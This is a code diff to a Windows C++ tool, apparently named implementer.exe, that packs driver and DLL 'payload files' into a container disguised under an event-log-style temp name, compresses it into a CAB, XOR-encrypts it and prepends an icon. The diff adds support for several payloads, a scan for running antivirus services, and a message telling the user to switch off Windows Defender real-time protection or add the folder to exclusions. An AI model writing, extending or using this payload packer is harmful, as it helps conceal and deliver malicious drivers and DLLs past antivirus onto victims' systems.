@@ -24,6 +24,7 @@
 #include <sys/stat.h>
 #include <io.h>
 #pragma comment(lib, "cabinet.lib")
+#pragma comment(lib, "advapi32.lib")
 #endif
 
 namespace fs = std::filesystem;
@@ -86,8 +87,7 @@ using ResultVoid = std::expected<void, std::string>;
 
 // Configuration structure
 struct Config {
-    std::string driver_file;
-    std::string dll_file;
+    std::vector<std::string> payload_files;
     std::string icon_file;
     std::string output_file;
 };
@@ -188,6 +188,31 @@ std::string trim(std::string_view str) {
     return std::string(str.substr(start, end - start + 1));
 }
 
+std::vector<std::string> split_list(std::string_view value, char delimiter = ',') {
+    std::vector<std::string> items;
+    size_t start = 0;
+
+    while (start <= value.size()) {
+        const size_t end = value.find(delimiter, start);
+        const auto token = (end == std::string_view::npos)
+            ? value.substr(start)
+            : value.substr(start, end - start);
+
+        std::string item = trim(token);
+        if (!item.empty()) {
+            items.push_back(std::move(item));
+        }
+
+        if (end == std::string_view::npos) {
+            break;
+        }
+
+        start = end + 1;
+    }
+
+    return items;
+}
+
 // Read entire file into vector using WinAPI
 Result<std::vector<uint8_t>> read_file_winapi(const std::string& filename) {
     WinFile file(filename, GENERIC_READ, OPEN_EXISTING);
@@ -273,13 +298,20 @@ Result<Config> read_config(const std::string& config_path) {
         // Key=Value pair
         size_t pos = line.find('=');
         if (pos != std::string::npos) {
+            if (!current_section.empty() && current_section != "Files") {
+                continue;
+            }
+
             std::string key = trim(line.substr(0, pos));
             std::string value = trim(line.substr(pos + 1));
 
-            if (key == "DriverFile") {
-                config.driver_file = value;
-            } else if (key == "DllFile") {
-                config.dll_file = value;
+            if (key == "DriverFile" || key == "DllFile" || key == "PayloadFile") {
+                auto files = split_list(value);
+                config.payload_files.insert(
+                    config.payload_files.end(),
+                    std::make_move_iterator(files.begin()),
+                    std::make_move_iterator(files.end())
+                );
             } else if (key == "IconFile") {
                 config.icon_file = value;
             } else if (key == "OutputFile") {
@@ -289,8 +321,7 @@ Result<Config> read_config(const std::string& config_path) {
     }
 
     // Validate config
-    if (config.driver_file.empty() || config.dll_file.empty() || 
-        config.icon_file.empty() || config.output_file.empty()) {
+    if (config.payload_files.empty() || config.icon_file.empty() || config.output_file.empty()) {
         return std::unexpected("Incomplete configuration in INI file");
     }
 
@@ -503,6 +534,80 @@ bool delete_file_winapi(const std::string& filename) {
     return DeleteFileW(wide_filename.c_str());
 }
 
+// Detect if Windows Defender (or any AV) is likely running
+bool is_av_likely_active() {
+#ifdef _WIN32
+    // Quick heuristic: check if MsMpEng.exe or common AV processes are running
+    // via Windows Security Center WMI query would be ideal but heavy;
+    // instead we check if the Defender service is running
+    SC_HANDLE scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
+    if (!scm) return false;
+
+    // Known AV service names (common ones)
+    const char* av_services[] = {
+        "WinDefend",       // Windows Defender
+        "MsMpSvc",         // Defender legacy
+        "AVP",             // Kaspersky
+        "avast! Antivirus",
+        "avgwd",           // AVG
+        "McShield",        // McAfee
+        "SAVService",      // Sophos
+        "ekrn",            // ESET
+        "bdagent",         // Bitdefender
+        nullptr
+    };
+
+    for (int i = 0; av_services[i] != nullptr; ++i) {
+        SC_HANDLE svc = OpenServiceA(scm, av_services[i], SERVICE_QUERY_STATUS);
+        if (svc) {
+            SERVICE_STATUS status{};
+            bool running = QueryServiceStatus(svc, &status) &&
+                           status.dwCurrentState == SERVICE_RUNNING;
+            CloseServiceHandle(svc);
+            if (running) {
+                CloseServiceHandle(scm);
+                return true;
+            }
+        }
+    }
+    CloseServiceHandle(scm);
+#endif
+    return false;
+}
+
+void print_av_warning() {
+    const std::string border(60, '-');
+    std::cout << "\n";
+    {
+        ColorGuard yellow(Color::Yellow);
+        std::cout << "  " << border << "\n";
+        std::cout << "  ! ANTIVIRUS / WINDOWS DEFENDER WARNING\n";
+        std::cout << "  " << border << "\n";
+        std::cout << "  Cabinet API (FCIAddFile) was blocked - this is a known\n";
+        std::cout << "  symptom of real-time AV protection intercepting file\n";
+        std::cout << "  operations on .sys / .dll payloads.\n\n";
+        std::cout << "  To proceed:\n";
+        std::cout << "    1. Open Windows Security\n";
+        std::cout << "       -> Virus & threat protection\n";
+        std::cout << "       -> Manage settings\n";
+        std::cout << "       -> Turn OFF Real-time protection\n";
+        std::cout << "    2. Or add this folder to exclusions:\n";
+
+        // Print current directory
+        char cwd[MAX_PATH];
+        if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
+            std::cout << "       " << cwd << "\n";
+        }
+
+        std::cout << "    3. Re-run implementer.exe\n";
+        std::cout << "    4. Re-enable protection after packaging\n\n";
+        std::cout << "  Other AV products: temporarily disable real-time\n";
+        std::cout << "  protection or add folder exclusion, then re-run.\n";
+        std::cout << "  " << border << "\n";
+    }
+    std::cout << "\n";
+}
+
 // Main packaging function
 ResultVoid package_files(const Config& config) {
     std::cout << "\n";
@@ -521,8 +626,10 @@ ResultVoid package_files(const Config& config) {
         ColorGuard yellow(Color::Yellow);
         std::cout << "Step 0: Configuration loaded\n";
     }
-    std::cout << "  - Driver: " << config.driver_file << "\n";
-    std::cout << "  - DLL: " << config.dll_file << "\n";
+    std::cout << "  - Payload files: " << config.payload_files.size() << "\n";
+    for (size_t i = 0; i < config.payload_files.size(); ++i) {
+        std::cout << "    [" << (i + 1) << "] " << config.payload_files[i] << "\n";
+    }
     std::cout << "  - Icon: " << config.icon_file << "\n";
     std::cout << "  - Output: " << config.output_file << "\n";
 
@@ -532,14 +639,9 @@ ResultVoid package_files(const Config& config) {
         ColorGuard yellow(Color::Yellow);
         std::cout << "Step 1: Verifying input files...\n";
     }
-    
-    std::vector<std::string> required_files = {
-        config.driver_file,
-        config.dll_file,
-        config.icon_file
-    };
 
-    for (const auto& file : required_files) {
+    size_t total_payload_size = 0;
+    for (const auto& file : config.payload_files) {
         if (!file_exists_winapi(file)) {
             ColorGuard red(Color::Red);
             std::cout << "  X File not found: " << file << "\n";
@@ -563,38 +665,62 @@ ResultVoid package_files(const Config& config) {
         
         ColorGuard green(Color::Green);
         std::cout << "  + Found: " << file << " (" << format_size_kb(size_result.value()) << ")\n";
+        total_payload_size += size_result.value();
     }
 
-    // Step 2: Concatenate PE files
+    if (!file_exists_winapi(config.icon_file)) {
+        ColorGuard red(Color::Red);
+        std::cout << "  X File not found: " << config.icon_file << "\n";
+        return std::unexpected("ABORTING: Required file missing: " + config.icon_file);
+    }
+
+    auto icon_size_result = get_file_size_winapi(config.icon_file);
+    if (!icon_size_result) {
+        ColorGuard red(Color::Red);
+        std::cout << "  X Cannot get size for: " << config.icon_file << " - " << icon_size_result.error() << "\n";
+        return std::unexpected(icon_size_result.error());
+    }
+
+    {
+        ColorGuard green(Color::Green);
+        std::cout << "  + Found: " << config.icon_file << " (" << format_size_kb(icon_size_result.value()) << ")\n";
+    }
+
+    // Step 2: Build payload container
     std::cout << "\n";
     {
         ColorGuard yellow(Color::Yellow);
-        std::cout << "Step 2: Concatenating PE files...\n";
-    }
-
-    auto driver_result = read_file_winapi(config.driver_file);
-    if (!driver_result) {
-        ColorGuard red(Color::Red);
-        std::cout << "  X Failed to read driver file: " << driver_result.error() << "\n";
-        return std::unexpected(driver_result.error());
-    }
-
-    auto dll_result = read_file_winapi(config.dll_file);
-    if (!dll_result) {
-        ColorGuard red(Color::Red);
-        std::cout << "  X Failed to read DLL file: " << dll_result.error() << "\n";
-        return std::unexpected(dll_result.error());
+        std::cout << "Step 2: Building payload container...\n";
     }
 
     std::vector<uint8_t> concatenated_data;
-    concatenated_data.reserve(driver_result->size() + dll_result->size());
-    concatenated_data.insert(concatenated_data.end(), driver_result->begin(), driver_result->end());
-    concatenated_data.insert(concatenated_data.end(), dll_result->begin(), dll_result->end());
+    concatenated_data.reserve(total_payload_size);
+
+    for (size_t i = 0; i < config.payload_files.size(); ++i) {
+        const auto& file = config.payload_files[i];
+
+        auto file_result = read_file_winapi(file);
+        if (!file_result) {
+            ColorGuard red(Color::Red);
+            std::cout << "  X Failed to read payload file: " << file_result.error() << "\n";
+            return std::unexpected(file_result.error());
+        }
+
+        concatenated_data.insert(
+            concatenated_data.end(),
+            file_result->begin(),
+            file_result->end()
+        );
+
+        ColorGuard green(Color::Green);
+        std::cout << "  + Added [" << (i + 1) << "/" << config.payload_files.size()
+                  << "]: " << file << " (" << format_size_kb(file_result->size()) << ")\n";
+    }
 
     auto write_result = write_file_winapi(std::string(TEMP_EVTX), concatenated_data);
     if (!write_result) {
         ColorGuard red(Color::Red);
-        std::cout << "  X Failed to create concatenated file: " << write_result.error() << "\n";
+        std::cout << "  X Failed to create payload container: " << write_result.error() << "\n";
         return std::unexpected(write_result.error());
     }
 
@@ -614,8 +740,16 @@ ResultVoid package_files(const Config& config) {
 #ifdef _WIN32
     auto cab_result = create_cab_file(std::string(TEMP_EVTX), std::string(TEMP_CAB));
     if (!cab_result) {
-        ColorGuard red(Color::Red);
-        std::cout << "  X CAB compression failed: " << cab_result.error() << "\n";
+        {
+            ColorGuard red(Color::Red);
+            std::cout << "  X CAB compression failed: " << cab_result.error() << "\n";
+        }
+        // "Failed to add file to cabinet" is the exact error Defender produces
+        // by blocking FCIAddFile mid-operation. Show AV advisory.
+        if (cab_result.error().find("Failed to add file") != std::string::npos ||
+            cab_result.error().find("Failed to create FCI") != std::string::npos) {
+            print_av_warning();
+        }
         return std::unexpected(cab_result.error());
     }
 
@@ -720,6 +854,8 @@ ResultVoid package_files(const Config& config) {
     std::cout << "Total size: " << format_size_kb(final_package.size()) << "\n";
     std::cout << "Structure: [" << icon_result->size() << "-byte icon] + [XOR-encrypted CAB]\n";
     std::cout << "Breakdown:\n";
+    std::cout << "  - Payload files: " << config.payload_files.size() << "\n";
+    std::cout << "  - Payload container: " << concatenated_data.size() << " bytes\n";
     std::cout << "  - Icon: " << icon_result->size() << " bytes\n";
     std::cout << "  - Encrypted CAB: " << encrypted_cab.size() << " bytes\n";
     {
